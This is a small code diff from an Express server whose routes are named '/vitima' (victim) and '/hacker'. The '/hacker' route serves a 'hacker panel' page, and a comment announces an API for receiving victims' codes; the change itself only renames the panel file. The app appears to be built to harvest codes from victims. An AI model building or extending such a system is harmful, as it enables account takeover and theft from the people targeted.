@@ -104,7 +104,7 @@ app.get('/vitima', (req, res) => {
 });
 
 app.get('/hacker', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'hacker-panel.html'));
+    res.sendFile(path.join(__dirname, 'public', 'hacker-painel.html'));
 });
 
 // API para receber códigos das vítimas
